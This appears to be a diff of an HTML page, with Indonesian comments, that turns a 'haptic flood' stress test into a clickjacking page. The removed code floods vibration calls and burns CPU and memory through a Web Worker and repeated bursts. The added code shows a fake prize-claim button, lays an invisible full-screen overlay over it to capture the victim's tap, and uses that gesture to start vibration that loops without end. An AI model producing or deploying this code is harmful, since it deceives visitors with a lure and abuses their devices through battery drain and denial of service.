@@ -1,141 +1,123 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Vibration Race Condition Test</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Clickjacking & Haptic Experiment</title>
 <style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
+  * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
   body { 
-    background: #000000; 
-    color: #ff0000; 
+    background: #121214; 
+    color: #ffffff; 
     min-height: 100vh; 
-    font-family: monospace;
+    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+    overflow: hidden;
+  }
+
+  /* LAPISAN 1: Umpan Visual (Yang Dilihat Pengguna) */
+  .game-layer {
+    position: absolute;
+    top: 0; left: 0; width: 100%; height: 100%;
     display: flex;
+    flex-direction: column;
     align-items: center;
     justify-content: center;
-    flex-direction: column;
     padding: 20px;
-  }
-  .box {
-    max-width: 450px;
-    width: 100%;
-    background: #111111;
-    padding: 25px;
-    border: 1px solid #330000;
-    border-radius: 4px;
+    z-index: 1;
     text-align: center;
   }
-  #log {
-    margin-top: 15px;
-    background: #050505;
-    color: #00ff00;
-    padding: 15px;
-    border-radius: 2px;
+  .fake-btn {
+    margin-top: 20px;
+    background: #007bff;
+    color: white;
+    padding: 15px 40px;
+    font-size: 18px;
+    font-weight: bold;
+    border-radius: 50px;
+    box-shadow: 0 4px 15px rgba(0,123,255,0.4);
+    animation: pulse 1.5s infinite;
+  }
+
+  /* LAPISAN 2: Clickjacking Invisible Overlay (Yang Mengeksekusi Getar) */
+  /* Lapisan ini menutupi seluruh layar secara transparan di atas game-layer */
+  .invisible-overlay {
+    position: absolute;
+    top: 0; left: 0;
+    width: 100vw;
+    height: 100vh;
+    background: transparent;
+    opacity: 0; /* Sepenuhnya tidak terlihat */
+    z-index: 999; /* Berada paling atas agar mendahului semua ketukan */
+    cursor: pointer;
+  }
+
+  #status-log {
+    margin-top: 30px;
+    font-family: monospace;
     font-size: 11px;
-    min-height: 150px;
-    max-height: 250px;
-    overflow-y: auto;
-    white-space: pre-wrap;
+    color: #00ff66;
+    background: #000;
+    padding: 10px;
+    border-radius: 5px;
+    width: 80%;
+    max-width: 300px;
     text-align: left;
-    border: 1px solid #002200;
+    min-height: 60px;
+  }
+
+  @keyframes pulse {
+    0% { transform: scale(1); }
+    50% { transform: scale(1.05); }
+    100% { transform: scale(1); }
   }
 </style>
 </head>
 <body>
 
-<div class="box">
-  <h3>HAPTIC FLOOD EXPERIMENT</h3>
-  <div id="log">> Initializing stress vectors...</div>
-</div>
+  <!-- Lapisan Umpan Psiko/Game -->
+  <div class="game-layer">
+    <h2>Klaim Hadiah Anda!</h2>
+    <p style="color: #aaa; margin-top: 5px; font-size: 14px;">Ketuk tombol di bawah untuk membuka hadiah.</p>
+    <div class="fake-btn">KLAIM SEKARANG</div>
+    
+    <div id="status-log">> Menunggu interaksi pengguna...</div>
+  </div>
+
+  <!-- Lapisan Clickjacking Transparan -->
+  <div class="invisible-overlay" id="victim-trigger"></div>
 
 <script>
 (function() {
-  var logBox = document.getElementById('log');
-  var waveCount = 0;
+  var trigger = document.getElementById('victim-trigger');
+  var logBox = document.getElementById('status-log');
+  var loopInterval = null;
 
-  function log(text) {
-    var ms = new Date().getMilliseconds();
-    logBox.innerHTML += "\n[" + ms + "ms] " + text;
-    logBox.scrollTop = logBox.scrollHeight;
+  function writeLog(text) {
+    logBox.innerHTML = "> " + text;
   }
 
-  var delay = function(ms) {
-    return new Promise(function(res) { setTimeout(res, ms); });
-  };
+  // Begitu pengguna mengetuk bagian mana saja di layar (karena terhalang overlay transparan)
+  trigger.addEventListener('click', function(e) {
+    writeLog("Gesture terdeteksi! Token akses aktif.");
 
-  // 1. INJEKSI BACKGROUND THREAD (WEB WORKER)
-  var blobCode = `
-    self.onmessage = function() {
-      setInterval(function() {
-        var dummy = 0;
-        for(var i=0; i<4000000; i++) {
-          dummy += Math.sin(i) * Math.cos(i);
-        }
-        self.postMessage("TICK");
-      }, 25);
-    };
-  `;
-  
-  try {
-    var blob = new Blob([blobCode], {type: 'application/javascript'});
-    var worker = new Worker(URL.createObjectURL(blob));
-    worker.onmessage = function() {
-      if (navigator.vibrate) navigator.vibrate(200);
-    };
-    worker.postMessage("GO");
-    log("Web Worker initialized.");
-  } catch(e) {
-    log("Worker bypassed/failed.");
-  }
+    if (navigator.vibrate) {
+      // 1. Eksekusi getaran angka raksasa instan memanfaatkan token yang aktif
+      navigator.vibrate(999999999999999999);
 
-  // 2. PARALLEL EVENT LOOP BURST
-  async function executeRaceWave() {
-    waveCount++;
-    log("Spamming Wave #" + waveCount + " (2500 Burst Requests)");
-
-    // Memory Heap Pressure
-    var heapSpam = [];
-    for(var m=0; m<1000; m++) { heapSpam.push(new Array(500).fill(Math.random())); }
-
-    var packet = [];
-    for (var i = 0; i < 2500; i++) {
-      packet.push((async function(id) {
-        await delay(Math.random() * 10);
-        if (!navigator.vibrate) return false;
-        
-        // Alternating payload strategies
-        return id % 2 === 0 ? navigator.vibrate(999999999999999999) : navigator.vibrate([500, 250, 500]);
-      })(i));
-    }
-
-    // Graphics Render Interception
-    requestAnimationFrame(function() {
-      if (navigator.vibrate) navigator.vibrate(999999999999999999);
-    });
-
-    var outcomes = await Promise.all(packet);
-    heapSpam = null;
-
-    if (outcomes.includes(true)) {
-      log("🚨 API Returned TRUE. Check physical device vibration!");
+      // 2. Eksploitasi Rantai Loop (Menjaga getaran tetap hidup selamanya)
+      if (loopInterval === null) {
+        loopInterval = setInterval(function() {
+          // Memompa getaran pendek konstan setiap 1 detik
+          navigator.vibrate(500);
+        }, 1000);
+        writeLog("🚨 GETAR LOOP AKTIF BERKELANJUTAN!");
+      }
     } else {
-      log("❌ Wave dropped by browser security core.");
+      writeLog("Browser tidak mendukung haptik.");
     }
-  }
 
-  // Initial execution window
-  executeRaceWave();
-
-  // Infinite relentless loop triggering every 750ms
-  setInterval(executeRaceWave, 750);
-
-  // Resume state exploitation
-  document.addEventListener('visibilitychange', function() {
-    if (!document.hidden) {
-      log("Visibility shift detected. Forcing batch requests...");
-      for(var x=0; x<30; x++) { if(navigator.vibrate) navigator.vibrate(999999999999999999); }
-    }
+    // Menghilangkan overlay setelah klik pertama agar pengguna bisa berinteraksi dengan web asli di bawahnya
+    trigger.style.display = 'none';
   });
 
 })();
